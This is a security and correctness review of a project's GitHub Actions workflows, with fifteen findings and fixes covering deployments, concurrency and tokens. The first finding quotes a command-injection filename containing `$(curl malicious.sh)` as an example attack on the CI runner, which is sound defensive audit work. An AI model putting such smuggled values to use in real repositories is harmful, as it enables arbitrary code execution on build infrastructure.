# GitHub Workflows Review

**Date:** 2025-04-11
**Scope:** All files in `.github/workflows/` and `.github/dependabot.yml`

---

## Critical

### 1. Shell injection in auto-translate workflow

- **File:** `auto-translate.yml` (L42–43)
- **Severity:** Critical (Security)
- **Issue:** `${{ steps.changed-files.outputs.all_changed_files }}` is interpolated directly into a bash `run` block. A malicious filename (e.g., `public/assets/locales/en/$(curl malicious.sh).json`) merged to `main` can achieve arbitrary command execution on the runner.
- **Fix:** Bind the output to an `env:` variable and reference it natively in bash, or pass the entire list to a single Python invocation that handles parsing safely.

---

## High

### 2. Non-release commits deploy to production

- **File:** `ci.yml` (L226–230)
- **Severity:** High
- **Issue:** `build-production` and the subsequent deploy jobs run on **every** push to `main`, even when `semantic-release` does not create a release. Chore and docs commits will build a `vX.Y.Z-dev.N` version and deploy it to production Cloudflare + Heroku.
- **Fix:** Gate `build-production` (or the deploy jobs) with `needs.release.outputs.released == 'true'`.

### 3. cancel-in-progress can abort deployments

- **File:** `ci.yml` (L20–22)
- **Severity:** High
- **Issue:** `cancel-in-progress: true` applies globally, including `main`. A rapid second push can abort a running deployment or `semantic-release` mid-flight, leaving production in a half-deployed state.
- **Fix:** Change to `cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}`.

### 4. Lighthouse history steps can never execute

- **File:** `ci.yml` (L144–157)
- **Severity:** High
- **Issue:** The "Update Performance History Dashboard" and "Deploy Lighthouse History" steps combine `github.event.pull_request.head.repo.full_name` (null on push events) with `github.ref == 'refs/heads/main'` (never true on PR events). These conditions are mutually exclusive and the steps will **never run**.
- **Fix:** Use only `github.ref == 'refs/heads/main' || github.ref == 'refs/heads/dev'` for push-triggered history updates. Guard against fork PRs separately if needed.

### 5. Screenshot push race condition

- **File:** `update-screenshots.yml` (L51–61)
- **Severity:** High
- **Issue:** `git push origin HEAD:main` from a detached tag HEAD will fail with a non-fast-forward error if any commit has landed on `main` since the tag was created.
- **Fix:** Fetch `main`, rebase, then push — or use `peter-evans/create-pull-request` to open a PR instead.

### 6. Duplicate screenshot workflow triggers

- **File:** `update-screenshots.yml` (L4–7)
- **Severity:** High
- **Issue:** The workflow triggers on both `push: tags: ["v*.*.*"]` and via `workflow_dispatch` from `post-deploy-production` in `ci.yml`. Every release fires this workflow **twice** concurrently, wasting CI minutes and causing potential Git push conflicts.
- **Fix:** Remove the `push: tags` trigger and rely exclusively on the `workflow_dispatch` from `ci.yml`.

---

## Medium

### 7. Wrong setup action for Python

- **File:** `auto-translate.yml` (L29–32)
- **Severity:** Medium
- **Issue:** The "Set up Python" step uses `actions/setup-node@v6` instead of `actions/setup-python@v5`. This is a copy-paste error. It only works because the Ubuntu runner has Python pre-installed.
- **Fix:** Change to `uses: actions/setup-python@v5` with `python-version: "3.11"`.

### 8. Auto-translate commits won't trigger Crowdin push

- **File:** `auto-translate.yml` (L47–51)
- **Severity:** Medium
- **Issue:** The auto-commit step uses the default `GITHUB_TOKEN`. By GitHub Actions design, commits pushed with this token **do not trigger** other workflows. The `crowdin-push.yml` workflow will never see these commits, leaving Crowdin permanently out of sync.
- **Fix:** Use a dedicated Personal Access Token (PAT) for the checkout or commit step.

### 9. Crowdin PR won't trigger CI checks

- **File:** `crowdin.yml` (L53–64)
- **Severity:** Medium
- **Issue:** `peter-evans/create-pull-request` uses the default `GITHUB_TOKEN`. The resulting PR will not trigger required CI status checks, potentially blocking merge if checks are required.
- **Fix:** Use a PAT instead of the default `GITHUB_TOKEN`.

### 10. Dependabot automerge concurrency is ineffective

- **File:** `dependabot-automerge.yml` (L13–15)
- **Severity:** Medium
- **Issue:** The concurrency group uses `${{ github.event.workflow_run.id }}`, which is globally unique per run. This creates a new concurrency bucket every time, completely defeating the concurrency control.
- **Fix:** Change to a static group like `group: dependabot-automerge` or scope to the PR branch.

### 11. Cloudflare cache purge silently fails

- **File:** `ci.yml` (L297–302)
- **Severity:** Medium
- **Issue:** The `curl` command for cache purge lacks the `--fail` (`-f`) flag. If Cloudflare returns a 4xx/5xx error, `curl` exits `0` and the step reports success despite stale assets remaining.
- **Fix:** Add `-f` to the curl command: `curl -f -s -X POST ...`

### 12. Duplicate Storybook/Chromatic workflow + unpinned action

- **File:** `storybook-tests.yml` (entire file)
- **Severity:** Medium
- **Issue:** This workflow duplicates the trigger criteria, path ignores, and Node setup already present in `ci.yml`'s `storybook-test` job, wasting CI minutes. Additionally, `chromaui/action@latest` is unpinned, posing a supply chain risk.
- **Fix:** Delete `storybook-tests.yml` and merge the Chromatic step into `ci.yml`'s existing `storybook-test` job. Pin the action to a specific commit SHA.

### 13. Dead conditional in Docker publish workflow

- **File:** `publish-images.yml` (L27)
- **Severity:** Medium
- **Issue:** The GHCR login step checks `github.event_name == 'push'`, but the workflow only triggers on `workflow_dispatch`. This is dead code.
- **Fix:** Remove the conditional or simplify to `if: github.event_name == 'workflow_dispatch'`.

---

## Low

### 14. Redundant Heroku CLI install

- **File:** `ci.yml` (L314–315)
- **Severity:** Low
- **Issue:** `curl https://cli-assets.heroku.com/install.sh | sh` is redundant — the `akhileshns/heroku-deploy` action already includes the Heroku CLI.
- **Fix:** Remove the "Install Heroku CLI" step.

### 15. Dependabot config (positive)

- **File:** `dependabot.yml`
- **Severity:** N/A (Compliment)
- **Note:** Well-structured grouping strategy (`dev-dependencies`, `production-minor-patch`) that pairs cleanly with the automerge workflow's parsing logic.

---

## Summary

| Severity | Count |
| -------- | ----- |
| Critical | 1     |
| High     | 5     |
| Medium   | 7     |
| Low      | 1     |

**Priority recommendation:** Fix items #1–#6 first — they represent active security, correctness, and deployment reliability risks.
